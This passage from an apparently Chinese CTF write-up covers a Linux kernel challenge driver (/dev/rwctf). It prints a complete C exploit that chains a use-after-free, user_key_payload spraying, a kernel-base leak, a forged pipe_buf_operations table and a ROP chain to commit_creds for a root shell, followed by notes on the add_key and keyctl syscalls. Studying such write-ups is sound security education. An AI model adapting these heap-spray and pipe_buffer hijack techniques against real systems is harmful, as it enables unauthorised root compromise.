<p>可以看到其中有一个bufs指针指向一个<code>struct pipe_buffer</code>，每个 <code>pipe_buffer</code> 结构体对应一张用以存储数据的内存页,虽然这个结构体不大,但是slab分配时会分配1024大小的obj</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>pipe_buf_operations</code> 为一张函数表，当我们对管道进行特定操作时内核便会调用该表上对应的函数，例如当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，由此我们便能控制内核执行流，从而完成提权。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">	 * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">	 * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">	 * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">	 * error.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">	 * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">	 * -&gt;steal() returns 0 for success, in which case the contents</span></span><br><span class="line"><span class="comment">	 * of the pipe (the buf-&gt;page) is locked and now completely owned</span></span><br><span class="line"><span class="comment">	 * by the caller. The page may then be transferred to a different</span></span><br><span class="line"><span class="comment">	 * mapping, the most often used case is insertion into different</span></span><br><span class="line"><span class="comment">	 * file address space cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> (*steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>那么这里我们可以利用 UAF 使得 <code>user_key_payload</code> 与 <code>pipe_inode_info</code> 占据同一个 object， <code>pipe_inode_info</code> 刚好会将 <code>user_key_payload-&gt;datalen</code> 改为 <code>0xFFFF</code> (这个字段应该是一个指针,至于为什么会是ffff不太清除使得我们能够继续读取数据,为了能够泄露数据肯定是个先用其uaf <code>user_key_payload</code>再uaf<code>pipe_inode_info</code>，从而读取 <code>pipe_inode_info</code> 以<u>泄露出 <code>pipe_buffer</code> 的地址。</u></p>
<p>而 <code>pipe_buffer</code> 是动态分配的，因此我们可以利用题目功能预先分配一个对象作为 <code>pipe_buffer</code> 并直接uaf在其上伪造函数表即可。</p>
<p>最终<strong>exp</strong>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kmalloc-192 has only 21 objects on a slub, we don&#x27;t need to spray to many */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_SPRAY_NUM 40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_INODE_INFO_SZ 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUFFER_SZ 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_FREE_PAYLOAD_RCU 0xffffffff813d8210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81096110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ed0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XCHG_RDI_RAX_DEC_STH_RET 0xffffffff81adfc70</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> idx;</span><br><span class="line">    <span class="type">uint32_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief allocate an object bby kmalloc(size, __GFP_ZERO | GFP_KERNEL )</span></span><br><span class="line"><span class="comment"> * __GFP_RECLAIM = __GFP_KSWAPD_RECLAIM | __GFP_DIRECT_RECLAIM </span></span><br><span class="line"><span class="comment"> * GFP_KERNEL = __GFP_RECLAIM | __GFP_IO | __GFP_FS</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param idx </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @param buf </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">uint32_t</span> idx, <span class="type">uint32_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">uint32_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf, pipe_buffer_addr;</span><br><span class="line">    <span class="type">int</span> key_id[KEY_SPRAY_NUM], victim_key_idx = <span class="number">-1</span>, pipe_key_id;</span><br><span class="line">    <span class="type">char</span> desciption[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to open the /dev/rwctf file!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF on user_key_payload */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct UAF obj and spray keys...&quot;</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;<span class="comment">//KEY_SPRAY_NUM不一定非得是40,只要能使得耗尽两个slab即可</span></span><br><span class="line">        <span class="built_in">snprintf</span>(desciption, <span class="number">0x100</span>, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;arttnba&quot;</span>, i);</span><br><span class="line">        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">        <span class="keyword">if</span> (key_id[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d key!\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to add_key()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);<span class="comment">//uaf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* corrupt user_key_payload&#x27;s header */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] corrupting user_key_payload...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (KEY_SPRAY_NUM * <span class="number">2</span>); i++) &#123;</span><br><span class="line">        alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);<span class="comment">//不太清楚为什么要循环这么多次,按照道理LIFO,第一个就应该是刚才del的0啊</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for oob-read and leak kernel base */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] try to make an OOB-read...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key_read(key_id[i], buf, <span class="number">0x4000</span>) &gt; PIPE_INODE_INFO_SZ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found victim key at idx: %d\n&quot;</span>, i);</span><br><span class="line">            victim_key_idx = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            key_revoke(key_id[i]);</span><br><span class="line">        &#125;<span class="comment">//如果读了超过192个字符,那么就说明其是victim,否则的话将其销毁置函数指针</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_key_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED at corrupt user_key_payload!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span> / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buf[i] &gt; kernel_base &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x210</span>) &#123;</span><br><span class="line">            kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;</span><br><span class="line">            kernel_base += kernel_offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="comment">//在读出来的内容中,挨个判断是否大于kernel_base并且以0x210结尾,是的话就基本确定其是所要的函数指针了,又一个疑问,这里其实有一定概率读出来的内容中并不存在函数指针的,例如目标obj位于slab的最后位置,而且就算确定有,那也是先读再销毁产生函数指针,靠Random freelist???</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == <span class="number">-1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to leak kernel addr!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF on pipe_inode_buffer to leak pipe_buffer&#x27;s addr */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct UAF on pipe_inode_info...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 0-&gt;1-&gt;..., the 1 will be the payload object */</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    alloc(<span class="number">1</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pipe_key_id = key_alloc(<span class="string">&quot;arttnba3pipe&quot;</span>, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* this object is for the pipe buffer */</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);<span class="comment">//uaf PIPE_INODE_INFO and key_user_payload</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* note that the user_key_payload-&gt;datalen is 0xFFFF now */</span></span><br><span class="line">    retval = key_read(pipe_key_id, buf, <span class="number">0xffff</span>);</span><br><span class="line">    pipe_buffer_addr = buf[<span class="number">16</span>]; <span class="comment">/* pipe_inode_info-&gt;bufs得到pipe_buffer的地址 */</span>/</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got pipe_buffer: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">            pipe_buffer_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct fake pipe_buf_operations */</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = pipe_buffer_addr + <span class="number">0x18</span>;  <span class="comment">/* pipe_buffer-&gt;ops,是函数指针表指向buffer内部 */</span></span><br><span class="line">    <span class="comment">/* after release(), we got back here */</span></span><br><span class="line">    buf[<span class="number">3</span>] = kernel_offset + POP_RBX_POP_RBP_POP_R12_RET;</span><br><span class="line">    <span class="comment">/* pipe_buf_operations-&gt;release */</span></span><br><span class="line">    buf[<span class="number">4</span>] = kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET;<span class="comment">//函数指针调用时第二个参数rsi就是buffer,所以之后才会又回到buf[3]</span></span><br><span class="line">    buf[<span class="number">5</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">6</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">7</span>] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    buf[<span class="number">8</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    buf[<span class="number">9</span>] = kernel_offset + PREPARE_KERNEL_CRED;</span><br><span class="line">    buf[<span class="number">10</span>] = kernel_offset + XCHG_RDI_RAX_DEC_STH_RET;</span><br><span class="line">    buf[<span class="number">11</span>] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    buf[<span class="number">12</span>] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">0x31</span>;</span><br><span class="line">    buf[<span class="number">13</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">14</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">15</span>] = getRootShell;</span><br><span class="line">    buf[<span class="number">16</span>] = user_cs;</span><br><span class="line">    buf[<span class="number">17</span>] = user_rflags;</span><br><span class="line">    buf[<span class="number">18</span>] = user_sp + <span class="number">8</span>; <span class="comment">/* system() wants it : ( */</span></span><br><span class="line">    buf[<span class="number">19</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);<span class="comment">//uaf pipe_buffer</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger pipe_buf_operations-&gt;release */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring pipe_buf_operations-&gt;release()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="kernel密钥管理接口"><a href="#kernel密钥管理接口" class="headerlink" title="kernel密钥管理接口"></a>kernel密钥管理接口</h3><p>在linux内核中有一套专门用于管理密钥的子系统,负责密钥的创建,读取,更新以及销毁等功能</p>
<p>内核提供了两个系统调用来负责这些操作</p>
<p><code>add_key()</code>和<code>keyctl()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                                    <span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br></pre></td></tr></table></figure>
<p>当调用<code>add_key()</code>创建带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时</p>
<ul>
<li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> (字符串，最大大小为 4096)、<code>payload</code> (普通数据，大小无限制)</li>
<li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li>
<li>释放 obj1 与 obj2，返回密钥 id</li>
</ul>
<p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p>
